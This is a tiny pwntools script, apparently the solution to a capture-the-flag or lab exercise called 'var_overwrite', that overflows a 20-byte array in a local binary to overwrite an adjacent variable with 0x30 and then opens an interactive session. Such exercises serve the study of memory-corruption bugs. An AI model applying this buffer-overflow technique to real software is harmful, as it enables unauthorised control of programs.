from pwn import*

p = process('./var_overwrite')

payload = 'A'*20		# arr
payload += p32(0x30)

p.sendline(payload)

p.interactive()


